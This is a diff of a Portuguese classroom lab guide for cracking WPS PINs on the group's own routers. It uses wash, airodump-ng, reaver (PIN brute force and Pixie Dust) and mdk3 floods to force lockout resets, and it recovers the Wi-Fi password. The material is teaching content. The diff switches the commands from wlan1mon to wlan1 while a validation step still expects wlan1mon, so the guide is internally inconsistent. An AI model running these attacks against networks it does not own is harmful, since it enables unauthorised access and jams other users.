@@ -9,18 +9,18 @@
 ## ℹ️ Informações do Documento
 
 | Campo | Descrição |
-|---|---|
+|-------|-----------|
 | **Autor** | Robson Vaamonde |
 | **Data de criação** | 22/07/2026 |
-| **Data de atualização** | 16/08/2026 |
-| **Versão** | 0.02 |
+| **Data de atualização** | 19/08/2026 |
+| **Versão** | 0.03 |
 | **Equipamentos testados** | Archer C50 (W) e Archer EC220-G5 |
 ---
 
 ### 🔗 Links do Autor
 
 | Canal | Link |
-|---|---|
+|-------|------|
 | Procedimentos em TI | http://procedimentosemti.com.br |
 | Bora para Prática | http://boraparapratica.com.br |
 | Site pessoal | http://vaamonde.com.br |
@@ -58,18 +58,16 @@
 O **WPS (Wi-Fi Protected Setup)** foi criado para facilitar o pareamento de dispositivos sem a necessidade de digitar a senha completa da rede — bastando um PIN numérico (geralmente 8 dígitos) ou o botão físico do roteador (PBC).
 
 | Fragilidade | Descrição |
-|---|---|
-| PIN dividido em dois blocos | O PIN de 8 dígitos é validado pelo AP em dois blocos separados (4 + 3 dígitos, o 8º é checksum), reduzindo drasticamente o espaço de busca em relação a um PIN de 8 dígitos único. |
-| Sem limite de tentativas (em muitos firmwares) | Diversos equipamentos não implementam bloqueio (*lockout*) adequado após tentativas malsucedidas, permitindo força bruta prática do PIN. |
-| Independe da complexidade da senha Wi-Fi | Mesmo que a senha da rede (WPA2) seja longa e complexa, o WPS aceita o PIN como caminho alternativo de autenticação — quebrando o PIN, a senha da rede é revelada. |
+|-------------|-----------|
+| **PIN dividido em dois blocos** | O **PIN de 8 dígitos** é validado pelo AP em dois blocos separados `(4 + 3 dígitos, o 8º é checksum)`, reduzindo drasticamente o espaço de busca em relação a um PIN de 8 dígitos único. |
+| **Sem limite de tentativas (em muitos firmwares)** | Diversos equipamentos não implementam bloqueio (*lockout*) adequado após tentativas malsucedidas, permitindo força bruta prática do PIN. |
+| **Independe da complexidade da senha Wi-Fi** | Mesmo que a senha da rede (WPA2) seja longa e complexa, o WPS aceita o PIN como caminho alternativo de autenticação — quebrando o PIN, a senha da rede é revelada. |
 ---
 
 > 💡 **Por isso é considerado mais simples:** diferente do WPA/WPA2 (que depende de um bom dicionário) ou do WEP (que depende de volume de IVs), o ataque ao WPS explora uma falha de **design do protocolo**, não a força da senha em si.
 ---
 
 ## 02 - Preparação do Ambiente e Modo Monitor
-
-### 🔧 Procedimento
 
 ```bash
 # Verificar se a interface wireless foi reconhecida
@@ -98,7 +96,7 @@ sudo iwconfig
 ### ✅ Testes de Validação
 
 | # | Teste |
-|---|---|
+|---|-------|
 | 1 | `iwconfig` exibe `wlan1mon` com **Mode:Monitor**. |
 | 2 | Nenhum processo do NetworkManager reaparece interferindo na interface. |
 ---
@@ -107,20 +105,18 @@ sudo iwconfig
 
 O **wash** é a ferramenta tradicional da suíte Reaver para identificar quais redes ao redor possuem o WPS habilitado.
 
-### 🔧 Procedimento
-
 ```bash
 # Listando todas as Redes Sem-Fio com suporte ao WPS (QSS) habilitado
 # opção do comando wash: -i (Set interface to capture packets on)
-sudo wash -i wlan1mon
+sudo wash -i wlan1
 
 # Modo scan (recomendado) para analisar ao Redes Sem-Fio com suporte ao WPS (QSS)
 # opções do comando wash: -i (Set interface to capture packets on), -s (Use scan mode)
-sudo wash -i wlan1mon -s
+sudo wash -i wlan1 -s
 ```
 
 | Campo | Descrição |
-|---|---|
+|-------|-----------|
 | `-i` | Interface em modo monitor a ser utilizada. |
 | `-s` | Modo *scan* — varre continuamente os canais em busca de APs com WPS ativo. |
 | **BSSID** | Endereço MAC do AP com WPS habilitado — necessário para os próximos comandos. |
@@ -134,28 +130,26 @@ sudo wash -i wlan1mon -s
 ### ✅ Testes de Validação
 
 | # | Teste |
-|---|---|
+|---|-------|
 | 1 | O AP do grupo aparece na listagem do `wash` com WPS habilitado. |
 | 2 | Campo **Locked** confirmado como `No` antes de iniciar o ataque de PIN. |
 ---
 
 ## 04 - Identificando o Método WPS Disponível (`airodump-ng --wps`)
 
-### 🔧 Procedimento
-
 ```bash
 # Escaneamento da rede utilizando o Airodump-NG em busca de Access Point com suporte ao WPS (QSS)
 # opção do comando airodump-ng: --wps (Display a WPS column with WPS version, config method(s))
-sudo airodump-ng --wps wlan1mon
+sudo airodump-ng --wps wlan1
 
 # Filtrando i Access Point com suporte ao WPS (QSS) com base no BSSID
 # opção do comando airodump-ng: -c ( Indicates the frequencies to listen to), --bssid (t will only show 
 # networks, matching the given bssid),--wps (Display a WPS column with WPS version, config method(s))
-sudo airodump-ng -c <CANAL> -bssid <BSSID_DO_AP_WPS> --wps wlan1mon
+sudo airodump-ng -c <CANAL> -bssid <BSSID_DO_AP_WPS> --wps wlan1
 ```
 
 | Método | Descrição |
-|---|---|
+|--------|-----------|
 | **Ether** | Ativação do WPS realizada pela interface Ethernet do equipamento. |
 | **LAB** | *Label* — PIN fixo impresso na etiqueta do dispositivo (mais previsível/fraco). |
 | **PBC** | *Push Button Configuration* — ativado pelo botão físico do roteador. |
@@ -175,11 +169,11 @@ Com o BSSID, canal e confirmação de que o WPS está desbloqueado, inicia-se o 
 # Explorando a falha de força bruta ao PIN do Access Point com WPS (QSS) habilitado
 # opções do comando reaver: -i (Name of the monitor-mode interface to use), -b (BSSID of the target AP), 
 # -c (Set the 802.11 channel for the interface), -vv (Display non-critical warnings for more)
-sudo reaver -i wlan1mon -b <BSSID_DO_AP> -c <CANAL> -vv
+sudo reaver -i wlan1 -b <BSSID_DO_AP> -c <CANAL> -vv
 ```
 
 | Parâmetro | Descrição |
-|---|---|
+|-----------|-----------|
 | `-i` | Interface em modo monitor. |
 | `-b` | BSSID do AP-alvo, obtido no passo 03. |
 | `-c` | Canal utilizado pelo BSSID Ap-Alvo |
@@ -191,7 +185,7 @@ sudo reaver -i wlan1mon -b <BSSID_DO_AP> -c <CANAL> -vv
 ### ✅ Resultado Esperado
 
 | Situação | Ação |
-|---|---|
+|----------|------|
 | ✅ `WPS PIN: 'XXXXXXXX'` / `WPA PSK: 'senha'` | Ataque bem-sucedido — anotar PIN e senha no relatório do grupo. |
 | ❌ `WPS transaction failed` repetidas vezes | O chipset pode não ser vulnerável ao Pixie Dust — seguir para o método tradicional com pausa (`-d`), abaixo. |
 ---
@@ -207,11 +201,11 @@ Com o BSSID, canal e confirmação de que o WPS está desbloqueado, inicia-se o 
 # opções do comando reaver: -i (Name of the monitor-mode interface to use), -b (BSSID of the target AP), 
 # -c (Set the 802.11 channel for the interface), -p (Use the specified WPS pin), -vv (Display non-critical
 # warnings for more)
-sudo reaver -i wlan1mon -b <BSSID_DO_AP> -c <CANAL> -p <NÚMERO_DO_PIN> -vv
+sudo reaver -i wlan1 -b <BSSID_DO_AP> -c <CANAL> -p <NÚMERO_DO_PIN> -vv
 ```
 
 | Parâmetro | Descrição |
-|---|---|
+|-----------|-----------|
 | `-i` | Interface em modo monitor. |
 | `-b` | BSSID do AP-alvo, obtido no passo 03. |
 | `-c` | Canal utilizado pelo BSSID Ap-Alvo |
@@ -235,7 +229,7 @@ Se o ataque anterior falhar continuamente ou o AP entrar em bloqueio (*lockout*)
 
 ```bash
 # Contornando o Lockout (Travamento) do Roteador com suporte ao Locked Yes
-sudo reaver -i wlan1mon -b <BSSID_DO_AP> -K 1 -d 302 -vv
+sudo reaver -i wlan1 -b <BSSID_DO_AP> -K 1 -d 302 -vv
 ```
 
 | Parâmetro | Descrição |
@@ -249,13 +243,13 @@ Alguns firmwares só resetam o estado do WPS após uma queda de conexão/reiníc
 
 ```bash
 # Terminal 1 — ataque de autenticação
-sudo mdk3 wlan1mon a -a <BSSID_DO_AP>
+sudo mdk3 wlan1 a -a <BSSID_DO_AP>
 
 # Terminal 2 — flood de desautenticação direcionado à rede
-sudo mdk3 wlan1mon x -t <BSSID_DO_AP> -n <ESSID_DO_AP> -s 200
+sudo mdk3 wlan1 x -t <BSSID_DO_AP> -n <ESSID_DO_AP> -s 200
 
 # Terminal 3 — ataque de beacon flood
-sudo mdk3 wlan1mon b -t <BSSID_DO_AP>
+sudo mdk3 wlan1 b -t <BSSID_DO_AP>
 ```
 
 > ⚠️ **Uso restrito ao laboratório:** este procedimento gera ruído significativo na rede e deve ser aplicado **apenas** contra o AP do próprio grupo, nunca em produção ou contra equipamentos de terceiros — o objetivo é puramente didático, para observar o comportamento de proteção do firmware.
@@ -263,7 +257,7 @@ sudo mdk3 wlan1mon b -t <BSSID_DO_AP>
 Após alguns instantes, confirme o destravamento consultando novamente:
 
 ```bash
-sudo wash -i wlan1mon
+sudo wash -i wlan1
 ```
 
 O campo **Locked** deve voltar a `No`, permitindo repetir o ataque de PIN do passo 05.
@@ -271,7 +265,7 @@ O campo **Locked** deve voltar a `No`, permitindo repetir o ataque de PIN do pas
 ### ✅ Testes de Validação
 
 | # | Teste |
-|---|---|
+|---|-------|
 | 1 | Reaver retorna o PIN WPS e a senha WPA/WPA2 da rede. |
 | 2 | Em caso de lockout, o campo `Locked` do `wash` retorna a `No` após o procedimento de destravamento. |
 ---
@@ -281,7 +275,7 @@ O campo **Locked** deve voltar a `No`, permitindo repetir o ataque de PIN do pas
 ### ✅ Testes de Validação Final
 
 | # | Teste |
-|---|---|
+|---|-------|
 | 1 | Conectar um dispositivo à rede do grupo usando a senha (PSK) revelada pelo Reaver, confirmando o acesso. |
 | 2 | Registrar no relatório: BSSID, ESSID, canal, PIN WPS encontrado, senha revelada e tempo total do ataque. |
 | 3 | Discutir em grupo: por que desabilitar o WPS (como feito na Aula 04, item 03) é uma das medidas de segurança mais recomendadas, mesmo em redes com senha WPA2/WPA3 forte. |
